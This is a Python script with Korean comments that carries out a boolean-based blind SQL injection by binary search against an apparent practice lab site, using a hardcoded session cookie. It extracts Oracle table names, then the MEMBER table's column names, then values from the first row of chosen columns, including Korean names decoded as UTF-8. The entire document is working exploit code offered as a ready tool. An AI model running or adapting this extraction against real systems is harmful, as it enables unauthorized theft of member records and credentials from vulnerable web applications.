import requests

url = "https://lab.eqst.co.kr:8110/practice/practice01/detail?id=61"
cookies = {
    "JSESSIONID": "7C55E0BB0C56024E69D81AA10AC935E5"
}

def find_value(query, start=0, end=65535):
    """Blind SQL binary search"""
    s, e = start, end
    while s < e:
        m = (s + e) // 2
        attack_query = f"({query}) > {m}"
        attack_url = url + " and " + attack_query
        response = requests.get(url=attack_url, cookies=cookies)
        if "애플워치" in response.text:
            s = m + 1
        else:
            e = m
    return e


# ----------------------------------------
# ① 테이블명 추출
# ----------------------------------------
query = "select count(table_name) from user_tables"
table_count = find_value(query, start=0, end=2000)
print(f"테이블 개수 : {table_count}개\n")

table_list = []
for rownum in range(1, table_count + 1):
    query = f"select length(a) from (select table_name a, rownum b from user_tables) where b = {rownum}"
    name_len = find_value(query, start=0, end=255)
    name_chars = []
    for idx in range(1, name_len + 1):
        query = f"select ascii(substr(a,{idx},1)) from (select table_name a, rownum b from user_tables) where b = {rownum}"
        val = find_value(query, start=0, end=127)
        name_chars.append(chr(val))
    table_name = "".join(name_chars)
    print(f"{rownum}번째 테이블명: {table_name}")
    table_list.append(table_name)


# ----------------------------------------
# ② MEMBER 테이블 컬럼명 추출
# ----------------------------------------
if "MEMBER" in table_list:
    print("\n[MEMBER 테이블 컬럼명 추출 시작]")
    query = "select count(column_name) from user_tab_columns where table_name='MEMBER'"
    column_count = find_value(query, start=0, end=1000)
    print(f"컬럼 개수 : {column_count}개\n")

    column_list = []
    for rownum in range(1, column_count + 1):
        query = f"select length(a) from (select column_name a, rownum b from user_tab_columns where table_name='MEMBER') where b={rownum}"
        col_len = find_value(query, start=0, end=255)
        col_chars = []
        for idx in range(1, col_len + 1):
            query = f"select ascii(substr(a,{idx},1)) from (select column_name a, rownum b from user_tab_columns where table_name='MEMBER') where b={rownum}"
            val = find_value(query, start=0, end=127)
            col_chars.append(chr(val))
        column_name = "".join(col_chars)
        print(f"{rownum}번째 컬럼명: {column_name}")
        column_list.append(column_name)
else:
    print("\nMEMBER 테이블이 존재하지 않습니다.")
    exit()


# ----------------------------------------
# ③ 사용자 입력으로 컬럼 선택 → 1행 데이터 출력
# ----------------------------------------
print("\n[MEMBER 테이블에서 보고 싶은 컬럼을 선택하세요]")
print("가능한 컬럼:", ", ".join(column_list))

user_input = input("→ 출력할 컬럼명을 콤마(,)로 구분해 입력: ").strip()
selected_columns = [c.strip().upper() for c in user_input.split(",") if c.strip()]
rownum = 1
result_list = []

for column in selected_columns:
    if column not in column_list:
        result_list.append(f"{column}=<존재하지 않음>")
        continue

    # NAME 컬럼은 UTF-8 한글 처리
    if column == "NAME":
        query = f"select lengthb({column}) from (select {column}, rownum r from MEMBER) where r={rownum}"
        byte_len = find_value(query, start=0, end=4000)
        byte_list = []
        for idx in range(1, byte_len + 1):
            query = (
                f"select to_number(substr(rawtohex(utl_i18n.string_to_raw({column},'AL32UTF8')),"
                f"{(idx-1)*2 + 1},2),'XX') "
                f"from (select {column}, rownum r from MEMBER) where r={rownum}"
            )
            b = find_value(query, start=0, end=255)
            byte_list.append(b)
        try:
            decoded = bytes(byte_list).decode("utf-8", errors="replace")
        except:
            decoded = "(디코딩 실패)"
        result_list.append(f"{column}={decoded}")

    # ASCII(영문/숫자) 컬럼 처리
    else:
        query = f"select length({column}) from (select {column}, rownum r from MEMBER) where r={rownum}"
        length = find_value(query, start=0, end=255)
        value = ""
        for i in range(1, length + 1):
            query = f"select ascii(substr({column},{i},1)) from (select {column}, rownum r from MEMBER) where r={rownum}"
            a = find_value(query, start=0, end=127)
            value += chr(a)
        result_list.append(f"{column}={value}")

print("\n▶ 1행 데이터:")
print(" | ".join(result_list))
